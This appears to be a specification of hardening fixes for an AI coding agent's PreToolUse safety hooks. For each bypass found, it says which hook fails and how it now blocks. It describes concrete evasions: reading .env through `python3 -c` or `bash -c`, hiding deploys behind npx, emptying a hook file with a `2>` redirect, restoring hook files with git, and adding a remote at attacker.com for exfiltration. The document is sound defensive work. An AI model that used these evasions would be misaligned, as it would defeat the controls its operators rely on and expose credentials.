## Fail-closed on empty or missing command (all four PreToolUse hooks)

Each of the four PreToolUse(Bash) hooks reads the command to inspect from
`.tool_input.command` via jq. When that field is absent or jq returns an empty
string, the current code exits 0 (allow). The patched behavior is fail-closed:
an empty or missing command is treated as a signal that something is wrong and
the hook must block.

Affected hooks: `block-dangerous-bash.sh`, `block-credential-read.sh`,
`block-egress.sh`, `block-dangerous-git.sh`.

### Confirmed behaviors

- **Empty CMD exits 2 (block) with a diagnostic:** Given `.tool_input.command`
  is present but jq resolves it to an empty string, each hook exits 2 and
  writes a diagnostic message to stderr. The hook does not exit 0.

- **Missing `.tool_input.command` field exits 2 (block) with a diagnostic:**
  Given the hook input JSON does not contain a `.tool_input.command` field so
  jq returns empty, each hook exits 2 and writes a diagnostic message to
  stderr.

## Non-shell interpreter bypass in `block-credential-read.sh`

`block-credential-read.sh` splits the command on shell separators (`;`, `|`,
`(`, `)`) and then checks each segment's verb against a list of known reader
tools. This works for simple commands like `cat .env`, but fails for inline
code strings: `python3 -c "print(open('.env').read())"` fragments into pieces
after splitting — `.env` ends up in a separate piece with no connection to the
`python3` verb. The fix adds a pre-split scan: if the command starts with an
interpreter name (`python3`, `node`, `ruby`, etc.) and contains `-c` or `-e`,
the hook checks the full unsplit command string for credential file names before
doing any splitting.

### Confirmed behaviors

- **`python3 -c "print(open('.env').read())"` is blocked:** Given the command
  starts with `python3` and contains `-c`, the hook scans the full raw command
  string before splitting it. It finds `.env` in the raw string and exits 2 (block).

## Bash/sh wrapper bypass (all three file-inspection hooks)

`block-credential-read.sh`, `block-dangerous-bash.sh`, and `block-egress.sh`
strip known wrapper verbs (e.g. `sudo`, `env`) before inspecting the real
command. `bash` and `sh` are not in the strip list, so a command that uses
`bash -c '...'` presents `bash` as the verb and the inner command is never
inspected.

### Confirmed behaviors

- **`bash -c 'cat .env'` is blocked by `block-credential-read.sh`:** Given the
  raw command is `bash -c 'cat .env'`, the hook strips `bash` as a wrapper
  verb, then inspects the inner command `cat .env`. It finds `cat` as the verb
  and `.env` as an argument matching the credential-file pattern, and exits 2
  (block).

## npx/yarn/pnpm wrapper bypass in `block-dangerous-bash.sh`

`block-dangerous-bash.sh` blocks deploy and destroy operations by matching the
command verb. Package-manager runners (`npx`, `yarn`, `pnpm`) are not in the
wrapper-strip list, so commands like `npx serverless deploy` present `npx` as
the verb and the deploy check is never reached.

### Confirmed behaviors

- **`npx serverless deploy` is blocked by `block-dangerous-bash.sh`:** Given
  the raw command is `npx serverless deploy`, the hook strips `npx` as a
  wrapper verb, then inspects the inner command `serverless deploy`. The deploy
  keyword triggers the deploy block and the hook exits 2 (block).

## Numeric stderr redirect not caught in `block-dangerous-bash.sh`

`block-dangerous-bash.sh` scans commands for redirect operators that could
overwrite protected files. The original scanner matches `>file` and `>>file`
but not `2>file`, `2>>file`, or other numeric file-descriptor redirects. An
agent can zero out a hook file by redirecting stderr with `2>`.

### Confirmed behaviors

- **`echo '' 2>.claude/hooks/block-dangerous-bash.sh` is blocked:** Given the
  command contains `2>` followed by a protected file path, the redirect scanner
  in `block-dangerous-bash.sh` matches the `2>` operator, identifies the target
  path as a protected file, and exits 2 (block).

## git restore and git checkout not blocked on protected paths

`block-dangerous-git.sh` blocks a set of destructive git sub-commands (reset,
clean, stash drop, branch delete, push force, etc.) but does not handle
`restore` or `checkout`. An agent can overwrite any file in the working tree
by restoring it from HEAD, including hook files.

### Confirmed behaviors

- **`git restore .claude/hooks/block-dangerous-bash.sh` is blocked:** Given
  the git sub-command is `restore` and the path argument matches a protected
  file under `.claude/hooks/`, the hook exits 2 (block).

- **`git checkout -- .claude/hooks/block-dangerous-bash.sh` is blocked:** Given
  the git sub-command is `checkout` with the `--` separator and the path
  argument matches a protected file under `.claude/hooks/`, the hook exits 2
  (block).

## git remote add/set-url not blocked (exfiltration path)

`block-dangerous-git.sh` does not inspect the `remote` sub-command. An agent
can add a remote pointing to an attacker-controlled URL and then push objects
(including credential-containing history) to it.

### Confirmed behaviors

- **`git remote add evil https://attacker.com` is blocked:** Given the git
  sub-command is `remote` and the next argument is `add`, the hook exits 2
  (block). The block applies regardless of the remote name or URL provided.
